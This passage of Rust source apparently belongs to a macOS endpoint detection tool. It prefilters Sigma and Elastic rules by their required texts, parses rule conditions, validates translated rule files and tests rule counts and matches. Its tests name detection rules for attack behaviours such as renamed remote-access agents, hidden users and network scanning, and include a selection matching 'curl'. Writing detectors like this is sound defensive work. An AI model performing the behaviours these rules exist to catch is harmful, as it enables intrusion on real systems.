// `all`, becomes a wildcard pattern whose literal runs must each occur, in that order, in the
// value folded one character at a time with `char::to_lowercase`, or as it is under `cased`; a
// field the start does not give matches nothing; a selection is all of its fields, a list of
// maps one of them; `not` binds closer than `and`, and `and` than `or`; `1 of` a name pattern
// is one of every selection the pattern could name, `all of` all of those it surely names, the
// names that begin with what stands before its last `*`. Each text here is a run
// of a value cut at `*`, `?` and `\`, folded the same way, so it lies within one such run and
// must occur wherever the value matches. The first run must also begin the field when nothing
// stands before it, neither a wildcard nor the `*` that `contains` and `endswith` put there,
// and the last must end it when nothing stands after it. Whatever is not read here exactly,
// another modifier, a value that is not a string, a keyword list, a condition with any other
// word, and whatever stands under `not`, needs nothing, and such a rule is asked as before.

/// Where in a field's value a text must be.
#[derive(Clone, Copy, Debug, PartialEq, Eq, PartialOrd, Ord)]
enum Place {
    Within,
    Start,
    End,
}

/// The texts the rules need, each numbered: in which field, where, and the text folded.
type Wanted = BTreeMap<(usize, Place, String), usize>;

/// A condition a start must meet for a rule to be able to match it.
#[derive(Clone, Debug, PartialEq)]
enum Need {
    /// Nothing can be said: the rule is asked.
    Any,
    /// The rule matches no start.
    Never,
    /// The field's value, folded, holds this text where it must, by its number in `Wanted`.
    Holds(usize),
    All(Vec<Need>),
    OneOf(Vec<Need>),
}

impl Need {
    fn holds(&self, held: &[bool]) -> bool {
        match self {
            Need::Any => true,
            Need::Never => false,
            Need::Holds(i) => held[*i],
            Need::All(all) => all.iter().all(|n| n.holds(held)),
            Need::OneOf(any) => any.iter().any(|n| n.holds(held)),
        }
    }
}

/// All of them, made as small as what they say allows.
fn all(parts: Vec<Need>) -> Need {
    let mut kept = Vec::new();
    for p in parts {
        match p {
            Need::Never => return Need::Never,
            Need::Any => {}
            p => kept.push(p),
        }
    }
    match kept.len() {
        0 => Need::Any,
        1 => kept.remove(0),
        _ => Need::All(kept),
    }
}

/// One of them, made as small as what they say allows.
fn one_of(parts: Vec<Need>) -> Need {
    let mut kept = Vec::new();
    for p in parts {
        match p {
            Need::Any => return Need::Any,
            Need::Never => {}
            p => kept.push(p),
        }
    }
    match kept.len() {
        0 => Need::Never,
        1 => kept.remove(0),
        _ => Need::OneOf(kept),
    }
}

/// A value folded as the evaluator folds what it compares: each character on its own.
fn fold(s: &str) -> String {
    if s.is_ascii() {
        s.to_ascii_lowercase()
    } else {
        s.chars().flat_map(char::to_lowercase).collect()
    }
}

/// The need of a rule about events of `kind` given in `layout`, from its YAML. `texts` numbers
/// each text a field must hold.
fn need(yaml: &Value, layout: &Layout, kind: Kind, texts: &mut Wanted) -> Need {
    let Some(detection) = yaml["detection"].as_mapping() else {
        return Need::Any;
    };
    let Some(condition) = yaml["detection"]["condition"].as_str() else {
        return Need::Any;
    };
    let mut selections = BTreeMap::new();
    for (name, value) in detection {
        match name.as_str() {
            Some("condition") => {}
            Some(name) => {
                selections.insert(name.to_string(), selection_need(value, layout, kind, texts));
            }
            None => return Need::Any,
        }
    }
    Condition::parse(condition, &selections).unwrap_or(Need::Any)
}

fn selection_need(value: &Value, layout: &Layout, kind: Kind, texts: &mut Wanted) -> Need {
    let map_need = |m: &serde_norway::Mapping, texts: &mut Wanted| {
        all(m
            .iter()
            .map(|(k, v)| match k.as_str() {
                Some(k) => field_need(k, v, layout, kind, texts),
                None => Need::Any,
            })
            .collect())
    };
    match value {
        Value::Mapping(m) => map_need(m, texts),
        Value::Sequence(items) if !items.is_empty() && items.iter().all(Value::is_mapping) => {
            one_of(
                items
                    .iter()
                    .filter_map(Value::as_mapping)
                    .map(|m| map_need(m, texts))
                    .collect(),
            )
        }
        _ => Need::Any,
    }
}

fn field_need(key: &str, value: &Value, layout: &Layout, kind: Kind, texts: &mut Wanted) -> Need {
    let mut parts = key.split('|');
    let name = parts.next().unwrap_or_default();
    let mut every = false;
    // Whether the value's first run begins the field and its last ends it.
    let (mut start, mut end) = (true, true);
    for modifier in parts {
        match modifier.to_lowercase().as_str() {
            "contains" => (start, end) = (false, false),
            "startswith" => end = false,
            "endswith" => start = false,
            "cased" => {}
            "all" => every = true,
            _ => return Need::Any,
        }
    }
    // Numbered among every kind's fields, as `Layout::forms` lays out the values.
    let Some(field) = layout.field(kind, name) else {
        return Need::Never;
    };
    let values: Vec<&Value> = match value {
        Value::Sequence(items) => items.iter().collect(),
        v => vec![v],
    };
    let needs = values
        .into_iter()
        .map(|v| match v {
            Value::String(s) => text_need(field, s, start, end, texts),
            _ => Need::Any,
        })
        .collect();
    if every { all(needs) } else { one_of(needs) }
}

/// What a value needs of a field: its longest run between wildcards and escapes within it,
/// its first run at the start when `start`, its last at the end when `end`, each folded. A run
/// that is empty needs nothing.
fn text_need(field: usize, value: &str, start: bool, end: bool, texts: &mut Wanted) -> Need {
    let runs: Vec<&str> = value.split(['*', '?', '\\']).collect();
    let longest = runs.iter().max_by_key(|run| run.chars().count());
    let mut wanted = |place: Place, run: Option<&&str>| match run {
        Some(run) if !run.is_empty() => {
            let next = texts.len();
            Need::Holds(*texts.entry((field, place, fold(run))).or_insert(next))
        }
        _ => Need::Any,
    };
    all(vec![
        wanted(Place::Within, longest),
        if start {
            wanted(Place::Start, runs.first())
        } else {
            Need::Any
        },
        if end {
            wanted(Place::End, runs.last())
        } else {
            Need::Any
        },
    ])
}

/// A rule's condition read for what it needs, by the evaluator's grammar: a selection by its
/// name, `1 of` or `all of` a name pattern or `them`, `not`, `and`, `or` and parentheses. Any
/// other word, or a condition left unread, gives `None`, and the rule needs nothing.
struct Condition<'a> {
    words: Vec<&'a str>,
    at: usize,
    selections: &'a BTreeMap<String, Need>,
}

impl<'a> Condition<'a> {
    fn parse(text: &'a str, selections: &'a BTreeMap<String, Need>) -> Option<Need> {
        // The evaluator's lexer counts characters where it cuts bytes, so it reads a condition
        // that is not ASCII otherwise than its words say.
        if !text.is_ascii() {
            return None;
        }
        let mut words = Vec::new();
        let mut start = None;
        for (i, c) in text.char_indices() {
            let cut = c == '(' || c == ')' || c.is_ascii_whitespace();
            match (cut, start) {
                (true, Some(s)) => {
                    words.push(&text[s..i]);
                    start = None;
                }
                (false, None) => start = Some(i),
                _ => {}
            }
            if c == '(' || c == ')' {
                words.push(&text[i..i + 1]);
            }
        }
        if let Some(s) = start {
            words.push(&text[s..]);
        }
        let mut c = Condition {
            words,
            at: 0,
            selections,
        };
        let need = c.or()?;
        (c.at == c.words.len()).then_some(need)
    }

    fn peek(&self) -> Option<String> {
        self.words.get(self.at).map(|w| w.to_ascii_lowercase())
    }

    fn next(&mut self) -> Option<&'a str> {
        let w = self.words.get(self.at).copied();
        self.at += 1;
        w
    }

    fn or(&mut self) -> Option<Need> {
        let mut parts = vec![self.and()?];
        while self.peek().as_deref() == Some("or") {
            self.at += 1;
            parts.push(self.and()?);
        }
        Some(one_of(parts))
    }

    fn and(&mut self) -> Option<Need> {
        let mut parts = vec![self.unary()?];
        while self.peek().as_deref() == Some("and") {
            self.at += 1;
            parts.push(self.unary()?);
        }
        Some(all(parts))
    }

    /// What stands under `not` needs nothing: its being false is not a text a start holds.
    fn unary(&mut self) -> Option<Need> {
        if self.peek().as_deref() == Some("not") {
            self.at += 1;
            self.unary()?;
            return Some(Need::Any);
        }
        self.primary()
    }

    fn primary(&mut self) -> Option<Need> {
        let word = self.next()?;
        match word.to_ascii_lowercase().as_str() {
            "(" => {
                let need = self.or()?;
                (self.next()? == ")").then_some(need)
            }
            q @ ("1" | "all") => {
                if !self.next()?.eq_ignore_ascii_case("of") {
                    return None;
                }
                let target = self.next()?;
                let them = target.eq_ignore_ascii_case("them");
                let every = q == "all";
                let named: Vec<Need> = if them {
                    self.selections.values().cloned().collect()
                } else if every {
                    // `all of` is held to names it surely covers: those that begin with what
                    // stands before its last `*`, read as it is written.
                    let prefix = target.strip_suffix('*')?;
                    self.selections
                        .iter()
                        .filter(|(n, _)| n.starts_with(prefix))
                        .map(|(_, need)| need.clone())
                        .collect()
                } else {
                    // `1 of` takes every name the pattern could cover.
                    self.selections
                        .iter()
                        .filter(|(n, _)| glob(target, n))
                        .map(|(_, need)| need.clone())
                        .collect()
                };
                if named.is_empty() {
                    return Some(Need::Any);
                }
                Some(if every { all(named) } else { one_of(named) })
            }
            _ => self.selections.get(word).cloned(),
        }
    }
}

/// Whether a name matches a pattern in which `*` stands for any run of characters.
fn glob(pattern: &str, name: &str) -> bool {
    match pattern.split_once('*') {
        None => pattern == name,
        Some((head, rest)) => {
            let Some(tail) = name.strip_prefix(head) else {
                return false;
            };
            (0..=tail.len())
                .filter(|i| tail.is_char_boundary(*i))
                .any(|i| glob(rest, &tail[i..]))
        }
    }
}

/// The texts the rules need, per field: one automaton that finds every text wanted within the
/// field in one pass, and the texts wanted at its start or end, each with its number.
struct Texts {
    count: usize,
    fields: Vec<FieldTexts>,
}

struct FieldTexts {
    within: Option<(aho_corasick::AhoCorasick, Vec<usize>)>,
    ends: Vec<(Place, String, usize)>,
}

impl Texts {
    /// For `count` fields; `None` when an automaton cannot be built, and then every rule is
    /// asked.
    fn new(texts: Wanted, count: usize) -> Option<Texts> {
        let mut fields = Vec::new();
        for field in 0..count {
            let mine = || texts.iter().filter(move |((f, _, _), _)| *f == field);
            let (needles, ids): (Vec<&String>, Vec<usize>) = mine()
                .filter(|((_, place, _), _)| *place == Place::Within)
                .map(|((_, _, text), id)| (text, *id))
                .unzip();
            // A DFA: a few hundred short texts make a small one, and it reads a long command
            // line several times faster than the default automaton.
            let within = if needles.is_empty() {
                None
            } else {
                let automaton = aho_corasick::AhoCorasick::builder()
                    .kind(Some(aho_corasick::AhoCorasickKind::DFA))
                    .build(&needles)
                    .ok()?;
                Some((automaton, ids))
            };
            let ends = mine()
                .filter(|((_, place, _), _)| *place != Place::Within)
                .map(|((_, place, text), id)| (*place, text.clone(), *id))
                .collect();
            fields.push(FieldTexts { within, ends });
        }
        Some(Texts {
            count: texts.len(),
            fields,
        })
    }

    /// Which texts the values of a start hold where they must, by their numbers. Every
    /// occurrence of every text within is reported, those inside another included, so a text
    /// is missed only if it is not there.
    fn held(&self, values: &[Option<String>]) -> Vec<bool> {
        let mut held = vec![false; self.count];
        for (value, field) in values.iter().zip(&self.fields) {
            let Some(value) = value else {
                continue;
            };
            let folded = fold(value);
            if let Some((automaton, ids)) = &field.within {
                for m in automaton.find_overlapping_iter(folded.as_str()) {
                    held[ids[m.pattern().as_usize()]] = true;
                }
            }
            for (place, text, id) in &field.ends {
                held[*id] = match place {
                    Place::Start => folded.starts_with(text.as_str()),
                    _ => folded.ends_with(text.as_str()),
                };
            }
        }
        held
    }
}

/// Whether a rule file has the shape its set's files have; the reason when it does not.
///
/// No mapping anywhere has the key `<<`. YAML 1.1 parsers that apply merge keys would read the
/// keys it brings in, and the parser here keeps it as a key of its own, so a file with one means
/// different things to different readers. This holds for every set.
///
/// A file of a translated set is exactly what the translator writes: its top keys are among
/// those the translator writes, its record has exactly the record's keys, and every key is a
/// plain string. Its level then follows from its set: a set that states no level has no `level`
/// key, since the translator writes none, and a null `severity` and `risk_score` in the record;
/// a translated set that states levels has the rule's `level` as the record's `severity`, as the
/// translator copies it. An allow-list, so a key the translator never writes, in whatever case
/// or spelling, is refused rather than ignored.
fn shape(yaml: &Value, source: &Source) -> Result<(), String> {
    fn merges(v: &Value) -> bool {
        match v {
            Value::Mapping(m) => m
                .iter()
                .any(|(k, v)| k.as_str() == Some("<<") || merges(k) || merges(v)),
            Value::Sequence(s) => s.iter().any(merges),
            Value::Tagged(t) => merges(&t.value),
            _ => false,
        }
    }
    if merges(yaml) {
        return Err("the file has a merge key `<<`, which YAML readers read differently".into());
    }
    let Some(t) = &source.translation else {
        return Ok(());
    };
    // The keys of a mapping that is one, each a plain string; `None` when one is not.
    let keys = |v: &Value| -> Option<Vec<String>> {
        v.as_mapping()?
            .keys()
            .map(|k| k.as_str().map(str::to_string))
            .collect()
    };
    let Some(top) = keys(yaml) else {
        return Err("the file is not a mapping of plain keys".into());
    };
    if let Some(k) = top.iter().find(|k| !t.keys.contains(&k.as_str())) {
        return Err(format!("the translator writes no key {k:?}"));
    }
    let record = &yaml[t.record];
    let Some(mut has) = keys(record) else {
        return Err(format!(
            "the translation's record `{}` is missing or not a mapping of plain keys",
            t.record
        ));
    };
    let mut wants: Vec<String> = t.record_keys.iter().map(|k| k.to_string()).collect();
    has.sort();
    wants.sort();
    if has != wants {
        return Err(format!(
            "the translation's record has the keys {has:?}, and the translator writes {wants:?}"
        ));
    }
    let severity = &record["severity"];
    if source.states_levels {
        if severity.as_str().is_none() || *severity != yaml["level"] {
            return Err("the translation's `severity` is not the rule's `level`".into());
        }
    } else if !severity.is_null() || !record["risk_score"].is_null() {
        return Err(
            "the set states no level, and the translation's `severity` or `risk_score` is not null"
                .into(),
        );
    }
    Ok(())
}

/// A rule is evaluated only with an id, so that a match can be named, and with a level, so that
/// it can be weighed, unless its set states none: then it is evaluated without one. That a file
/// of such a set states no level is its shape's to hold (`shape`).
fn meta(rule: &sigma_rust::Rule, yaml: &Value, source: &'static Source) -> Result<Meta, String> {
    // The evaluator refuses a level or status that is not Sigma's; it allows none.
    fn one_of<T: Copy>(table: &[(&str, T)], key: &str, yaml: &Value) -> Result<T, String> {
        let value = yaml[key].as_str();
        table
            .iter()
            .find(|(n, _)| Some(*n) == value)
            .map(|(_, v)| *v)
            .ok_or(format!("the rule has no {key}"))
    }
    let id = rule.id.clone().ok_or("the rule has no id")?;
    let level = if source.states_levels {
        Some(one_of(&LEVELS, "level", yaml)?)
    } else {
        None
    };
    Ok(Meta {
        name: format!("{}:{id}", source.name),
        id,
        title: rule.title.clone(),
        level,
        status: one_of(&STATUSES, "status", yaml)?,
        author: rule.author.clone(),
        techniques: rule
            .tags
            .iter()
            .flatten()
            .filter_map(|t| t.strip_prefix("attack.t"))
            .map(|t| format!("T{t}"))
            .collect(),
        description: yaml["description"].as_str().map(str::to_string),
        source,
    })
}

/// Places a parsed rule. A selection is a map of fields, all of which must match, or a list of
/// such maps, one of which must. A map that names a field a program start does not give can
/// never match: the evaluator takes an absent field as not matching. If every map of some
/// selection is like that, the rule is not evaluated, whatever its condition says, since
/// reading the condition is the evaluator's. If only some maps are, the rest of each selection
/// still matches as the rule means, so the rule is evaluated in part and those maps are named.
/// The fields are those the rule's schema gives (`layout`). The alternatives a translation left
/// out (`left`) never match either, and make a rule that is otherwise whole evaluated in part.
fn place(yaml: &Value, layout: &Layout, left: Vec<Branch>) -> Placement {
    let category = yaml["logsource"]["category"].as_str().unwrap_or_default();
    let Some(kind) = Kind::of(category) else {
        return Placement::NotEvaluated(Reason::NeedsEvents(category.to_string()));
    };
    let fields = layout.names(kind);
    let given = |f: &&str| fields.iter().any(|n| n == f);
    let mut dead = left;
    let mut lacking_all = BTreeSet::new();
    let mut a_selection_is_dead = false;
    for (name, selection) in yaml["detection"].as_mapping().into_iter().flatten() {
        let Some(name) = name.as_str().filter(|n| *n != "condition") else {
            continue;
        };
        let maps: Vec<&serde_norway::Mapping> = match selection {
            Value::Mapping(m) => vec![m],
            Value::Sequence(items) if items.iter().all(Value::is_mapping) => {
                items.iter().filter_map(Value::as_mapping).collect()
            }
            _ => return Placement::NotEvaluated(Reason::KeywordSearch),
        };
        let mut alive = false;
        for map in maps {
            let lacking: BTreeSet<&str> = map
                .keys()
                .filter_map(Value::as_str)
                .filter_map(|k| k.split('|').next())
                .filter(|f| !given(f))
                .collect();
            if lacking.is_empty() {
                alive = true;
            } else {
                lacking_all.extend(lacking.iter().map(|f| f.to_string()));
                dead.push(Branch {
                    selection: Some(name.to_string()),
                    fields: lacking.into_iter().map(str::to_string).collect(),
                    said: None,
                });
            }
        }
        a_selection_is_dead |= !alive;
    }
    if a_selection_is_dead {
        Placement::NotEvaluated(Reason::NeedsFields(lacking_all.into_iter().collect()))
    } else if dead.is_empty() {
        Placement::Evaluated
    } else {
        Placement::InPart(dead)
    }
}

/// No field of a program start needs a keep today, so a set whose schema says one does stands
/// in for one in tests.
#[cfg(test)]
pub(crate) mod testing {
    use super::*;

    static SCHEMA: Schema = Schema {
        process: &crate::events::ECS_FIELDS,
        file: &crate::events::FILE_ECS_FIELDS,
        numbers: &[],
        links: false,
        folded: None,
        kept: &[(
            Kind::Process,
            "process.working_directory",
            crate::events::SCRIPT,
        )],
    };

    // Not a translated set: its one rule is written here, not by a translator.
    static SET: Source = Source {
        schema: &SCHEMA,
        translation: None,
        ..ELASTIC
    };

    /// The translation's record as the translator writes one for a rule of `source`: every key
    /// of its record, with `severity` as given (a quoted level, or `null`), a risk score that
    /// is null with it, and `left_out` as the list of what it left out. The other keys, which
    /// nothing here reads, are null.
    pub fn record_of(source: &Source, severity: &str, left_out: &str) -> String {
        let t = source.translation.as_ref().unwrap();
        let fields: Vec<String> = t
            .record_keys
            .iter()
            .map(|k| match *k {
                "severity" => format!("\"severity\": {severity}"),
                "risk_score" if severity == "null" => "\"risk_score\": null".to_string(),
                "risk_score" => "\"risk_score\": 47".to_string(),
                "in_part_missing_fields" => format!("\"in_part_missing_fields\": [{left_out}]"),
                k => format!("\"{k}\": null"),
            })
            .collect();
        format!("{}: {{{}}}\n", t.record, fields.join(", "))
    }

    /// One rule of that set, about program starts: it fires on a start whose working directory
    /// is not `/tmp`, so on one without a working directory too.
    pub fn process_kept() -> Rules {
        Rules::load_as(
            &SET,
            &[(
                "cwd.yml",
                "title: Invented cwd\nid: 00000000-0000-4000-8000-000000000010\nstatus: test\n\
                 level: high\nlogsource: {\"product\": \"macos\", \"category\": \"process_creation\"}\n\
                 detection:\n  s1: {\"process.working_directory|cased\": [\"/tmp\"]}\n  condition: \"not s1\"\n",
            )],
        )
    }
}

#[cfg(test)]
mod tests {
    use super::testing::record_of;
    use super::*;

    fn start(image: &str, args: &[&str], parent: &str) -> ProcessStart {
        ProcessStart {
            executable: image.to_string(),
            args: args.iter().map(|a| a.to_string()).collect(),
            parent_executable: Some(parent.to_string()),
            ..ProcessStart::default()
        }
    }

    /// A file created at `path`, or renamed there from `from`, by `image`.
    fn file(image: &str, path: &str, from: Option<&str>) -> FileEvent {
        FileEvent {
            timestamp: "2026-10-04T00:00:02.000002Z".into(),
            action: if from.is_some() { "rename" } else { "create" },
            path: path.into(),
            source: from.map(str::to_string),
            executable: image.into(),
            ..FileEvent::default()
        }
    }

    fn fired<'e>(rules: &Rules, s: impl Into<Subject<'e>>) -> Vec<String> {
        rules
            .evaluate(s)
            .iter()
            .map(|m| m.meta.id.clone())
            .collect()
    }

    /// The rules a start makes `evaluate` ask, in every schema, by their files.
    fn asked_of<'a>(rules: &'a Rules, s: &ProcessStart) -> Vec<&'a str> {
        let mut files = Vec::new();
        for (n, layout) in rules.layouts.iter().enumerate() {
            for values in layout.forms(Subject::Start(s)) {
                let asked = rules.asked(n, Kind::Process, s.kept, &values);
                files.extend(asked.into_iter().map(|i| rules.rules[i].file));
            }
        }
        files
    }

    fn fires<'e>(rules: &Rules, id: &str, s: impl Into<Subject<'e>>) -> bool {
        fired(rules, s).iter().any(|f| f == id)
    }

    fn by_id<'a>(rules: &'a Rules, id: &str) -> &'a Loaded {
        rules
            .rules
            .iter()
            .find(|l| l.meta.as_ref().is_some_and(|m| m.id == id))
            .unwrap_or_else(|| panic!("{id} is not shipped"))
    }

    const BINARY_PADDING: &str = "95361ce5-c891-4b0a-87ca-e24607884a96";
    const RENAMED_MESHAGENT: &str = "bd3b5eaa-439d-4a42-8f35-a49f5c8a2582";
    const BROWSER_CHILD: &str = "0250638a-2b28-4541-86fc-ea4c558fa0c6";
    const HIDDEN_USER: &str = "b22a5b36-2431-493a-8be1-0bae56c28ef3";
    const NETWORK_SCANNING: &str = "84bae5d4-b518-4ae0-b331-6d4afd34d00f";
    const FILE_DISCOVERY: &str = "089dbdf6-b960-4bcc-90e3-ffc3480c20f6";

    /// The rule files in a set's folder, by their paths under it.
    fn on_disk(source: &Source) -> BTreeSet<String> {
        let root = std::path::Path::new(env!("CARGO_MANIFEST_DIR")).join(source.folder);
        let mut on_disk = BTreeSet::new();
        let mut dirs = vec![root.clone()];
        while let Some(dir) = dirs.pop() {
            for entry in std::fs::read_dir(&dir).unwrap() {
                let path = entry.unwrap().path();
                if path.is_dir() {
                    dirs.push(path);
                } else if path.extension().is_some_and(|e| e == "yml") {
                    let rel = path.strip_prefix(&root).unwrap();
                    on_disk.insert(rel.to_str().unwrap().to_string());
                }
            }
        }
        on_disk
    }

    /// No false calm: every file in each set's folder is shipped, every rule is placed as
    /// evaluated, evaluated in part or not evaluated with a reason, every upstream rule a
    /// translated set did not take is named with its reason, and the numbers add up. A rule
    /// added to a folder and not to its list fails here, and so does one that changes the
    /// numbers, until someone looks at where it went. SigmaHQ's 75 are placed as before.
    #[test]
    fn every_shipped_rule_is_accounted_for() {
        for source in SOURCES {
            let root = std::path::Path::new(env!("CARGO_MANIFEST_DIR")).join(source.folder);
            let shipped: BTreeSet<String> =
                source.files.iter().map(|(p, _)| p.to_string()).collect();
            assert_eq!(
                on_disk(source),
                shipped,
                "the folder and the shipped list of {} differ",
                source.name
            );
            for (path, text) in source.files {
                let on_disk = std::fs::read_to_string(root.join(path)).unwrap();
                assert_eq!(&on_disk, text, "{path} is compiled in as it is on disk");
                let yaml: Value = serde_norway::from_str(text).unwrap();
                assert_eq!(
                    yaml["logsource"]["product"].as_str(),
                    Some("macos"),
                    "{path}"
                );
            }
        }

        let rules = Rules::shipped();
        let s = rules.summary_json();
        let totals = |name: &str| {
            let source = s["sources"]
                .as_array()
                .unwrap()
                .iter()
                .find(|x| x["name"] == name)
                .unwrap();
            let t = &source["totals"];
            [
                &t["shipped"],
                &t["not_taken"],
                &t["evaluated"],
                &t["in_part"],
                &t["not_evaluated"],
            ]
            .map(|v| v.as_u64().unwrap())
        };
        assert_eq!(totals("sigma"), [75, 0, 74, 1, 0]);
        // Of Elastic's 185 rules for macOS, 66 translated: 12 of them with an alternative the
        // translation left out, and 119 not taken.
        assert_eq!(totals("elastic"), [66, 119, 54, 12, 119]);
        // Of Elastic's 278 behaviour rules for macOS, 57 translated: 10 of them with an
        // alternative the translation left out, and 221 not taken.
        assert_eq!(totals("elastic-behaviour"), [57, 221, 47, 10, 221]);
        assert_eq!(
            s["totals"],
            json!({ "shipped": 198, "not_taken": 340, "evaluated": 175, "in_part": 23, "not_evaluated": 340 })
        );
        let ids = |key: &str, source: &str, events: &str| -> Vec<String> {
            let mut ids: Vec<String> = s[key]
                .as_array()
                .unwrap()
                .iter()
                .filter(|r| r["events"] == events && r["source"] == source)
                .map(|r| r["id_text"].as_str().unwrap().to_string())
                .collect();
            ids.sort();
            ids
        };
        assert_eq!(ids("evaluated", "sigma", CATEGORY).len(), 69);
        assert_eq!(ids("in_part", "sigma", CATEGORY), [RENAMED_MESHAGENT]);
        // The five rules for file events, each evaluated in full over files created or renamed.
        assert_eq!(ids("evaluated", "sigma", FILE_CATEGORY), FILE_RULES);
        assert_eq!(ids("evaluated", "elastic", CATEGORY).len(), 49);
        assert_eq!(ids("evaluated", "elastic", FILE_CATEGORY).len(), 5);
        assert_eq!(ids("evaluated", "elastic-behaviour", CATEGORY).len(), 44);
        assert_eq!(
            ids("evaluated", "elastic-behaviour", FILE_CATEGORY).len(),
            3
        );
        assert_eq!(
            (rules.evaluated(Kind::Process), rules.evaluated(Kind::File)),
            (69 + 49 + 44, 5 + 5 + 3)
        );
        // No two rules share an id: the store counts matches by a rule's id.
        let all: Vec<&str> = rules
            .rules
            .iter()
            .filter_map(|l| l.meta.as_ref())
            .map(|m| m.id.as_str())
            .collect();
        assert_eq!(all.iter().collect::<BTreeSet<_>>().len(), all.len());
        assert_eq!(all.len(), 538);
    }

    /// Every shipped rule file is the file as it was taken, byte for byte: for every set, its
    /// sha256 is the one its folder's `SHA256SUMS` records (`rules/sigma/` as SigmaHQ published
    /// them, `rules/elastic/` and `rules/elastic-behaviour/` as the translator wrote them), and
    /// the manifest names every file and no other. A translated set's list of the upstream rules
    /// it did not take, `not-taken.tsv`, is recorded with its files. A set without a manifest
    /// fails here.
    #[test]
    fn every_shipped_rule_is_the_file_its_set_s_manifest_records() {
        let root = std::path::Path::new(env!("CARGO_MANIFEST_DIR"));
        for source in SOURCES {
            let manifest = std::fs::read_to_string(root.join(source.folder).join("SHA256SUMS"))
                .unwrap_or_else(|e| panic!("{}: {e}", source.name));
            let recorded: BTreeMap<&str, &str> = manifest
                .lines()
                .map(|l| {
                    let (hash, path) = l.split_once("  ").unwrap();
                    (path, hash)
                })
                .collect();
            let not_taken = source.not_taken.map(|text| ("not-taken.tsv", text));
            let shipped: BTreeMap<&str, String> = source
                .files
                .iter()
                .copied()
                .chain(not_taken)
                .map(|(path, text)| (path, crate::sha256::hex(text.as_bytes())))
                .collect();
            assert_eq!(
                recorded.keys().collect::<Vec<_>>(),
                shipped.keys().collect::<Vec<_>>(),
                "{}",
                source.name
            );
            for (path, hash) in &shipped {
                assert_eq!(recorded[path], hash, "{path} differs from the manifest");
            }
        }
    }

    /// One sample of `tests/elastic/samples.jsonl` or `tests/elastic-behaviour/samples.jsonl`
    /// as the event level would record it.
    enum Sample {
        Start(ProcessStart),
        File(FileEvent),
    }

    impl Sample {
        fn of(e: &Json) -> Sample {
            let text = |k: &str| e[k].as_str().map(str::to_string);
            let number = |k: &str| e[k].as_i64();
            match e["kind"].as_str().unwrap() {
                "exec" => Sample::Start(ProcessStart {
                    executable: text("executable").unwrap(),
                    args: e["args"]
                        .as_array()
                        .unwrap()
                        .iter()
                        .map(|a| a.as_str().unwrap().to_string())
                        .collect(),
                    parent_executable: text("parent_executable"),
                    working_directory: text("working_directory"),
                    // The behaviour set's samples give no pid, which no rule reads.
                    pid: number("pid").unwrap_or_default(),
                    parent_pid: number("parent_pid"),
                    user_id: number("user_id"),
                    signing_id: text("signing_id"),
                    team_id: text("team_id"),
                    ..ProcessStart::default()
                }),
                kind => Sample::File(FileEvent {
                    action: crate::events::FILE_KINDS
                        .into_iter()
                        .find(|k| *k == kind)
                        .unwrap(),
                    path: text("path").unwrap(),
                    source: text("source"),
                    executable: text("executable").unwrap(),
                    ..FileEvent::default()
                }),
            }
        }
    }

    #[test]
    fn elastic_s_rules_match_the_samples_exactly_as_the_reference_said() {
        // Each translation was checked against a reference for Elasticsearch's meaning on the
        // translator's invented events (`rules/elastic/NOTICE`); `tests/elastic/samples.jsonl`
        // holds some of them, for every translated rule events it matches and near misses, each
        // with the rules the reference said it matches. The one call the core's reading and
        // `immune matches` both make must give Elastic's rules exactly those: none fewer, none
        // more.
        samples_match_as_the_reference_said(
            &ELASTIC,
            include_str!("../tests/elastic/samples.jsonl"),
            66,
        );
    }

    #[test]
    fn elastic_s_behaviour_rules_match_the_samples_exactly_as_the_reference_said() {
        // The same for Elastic's behaviour rules (`rules/elastic-behaviour/NOTICE`), whose
        // samples are in `tests/elastic-behaviour/samples.jsonl`. That they state no level
        // changes nothing in what they match.
        samples_match_as_the_reference_said(
            &ELASTIC_BEHAVIOUR,
            include_str!("../tests/elastic-behaviour/samples.jsonl"),
            57,
        );
    }

    /// Every sample matches exactly the rules of `source` the reference said, and every one of
    /// its `translated` rules is held to a sample it must match and one of its kind it must not.
    fn samples_match_as_the_reference_said(
        source: &'static Source,
        samples: &str,
        translated: usize,
    ) {
        let rules = Rules::shipped();
        let mut differ = Vec::new();
        let mut matched: BTreeSet<String> = BTreeSet::new();
        let mut missed: BTreeSet<String> = BTreeSet::new();
        for line in samples.lines() {
            let sample: Json = serde_json::from_str(line).unwrap();
            let expected: BTreeSet<String> = sample["matches"]
                .as_array()
                .unwrap()
                .iter()
                .map(|m| m.as_str().unwrap().to_string())
                .collect();
            let event = Sample::of(&sample["event"]);
            let (got, kind) = match &event {
                Sample::Start(s) => (rules.evaluate(s), Kind::Process),
                Sample::File(f) => (rules.evaluate(f), Kind::File),
            };
            let got: BTreeSet<String> = got
                .iter()
                .filter(|m| std::ptr::eq(m.meta.source, source))
                .map(|m| m.meta.name.clone())
                .collect();
            if got != expected {
                differ.push(format!(
                    "{}: expected {expected:?}, matched {got:?}",
                    sample["event"]
                ));
            }
            for l in rules.rules.iter().filter(|l| l.kind == Some(kind)) {
                let Some(m) = l.meta.as_ref().filter(|m| std::ptr::eq(m.source, source)) else {
                    continue;
                };
                if expected.contains(&m.name) {
                    matched.insert(m.name.clone());
                } else {
                    missed.insert(m.name.clone());
                }
            }
        }
        assert!(differ.is_empty(), "{}", differ.join("\n"));
        // Every translated rule is held to a sample it must match and one of its kind it must
        // not.
        let all: BTreeSet<String> = rules
            .rules
            .iter()
            .filter(|l| std::ptr::eq(l.source, source) && !l.not_taken())
            .map(|l| l.meta.as_ref().unwrap().name.clone())
            .collect();
        assert_eq!(all.len(), translated);
        assert_eq!(matched, all);
        assert_eq!(missed, all);
    }

    /// An invented rule as the translator writes one, of Elastic's set: `left_out` is the list
    /// of what it left out, as its record holds it.
    fn translated(detection: &str, category: &str, left_out: &str) -> &'static str {
        let text = format!(
            "title: Invented\nid: 00000000-0000-4000-8000-000000000009\nstatus: test\n\
             level: high\nlogsource: {{\"product\": \"macos\", \"category\": \"{category}\"}}\n\
             detection:\n{detection}{}",
            record_of(&ELASTIC, "\"high\"", left_out)
        );
        Box::leak(text.into_boxed_str())
    }

    /// A translated rule is asked by the names Elastic's rules use, so its texts are searched
    /// for like any rule's, and never taken for a field this level does not have. A name the
    /// schema does not give is named: in a selection the rule cannot do without, the rule is not
    /// evaluated; in one alternative, or in what the translation recorded as left out, it is
    /// evaluated in part. A translated file without its record is not evaluated, since what was
    /// left out of it would not be known.
    #[test]
    fn a_translated_rule_reads_elastic_s_names_and_one_it_cannot_have_is_named() {
        let curl = "  s1: {\"process.name|cased\": [\"curl\"]}\n";
        let whole = translated(
            &format!(
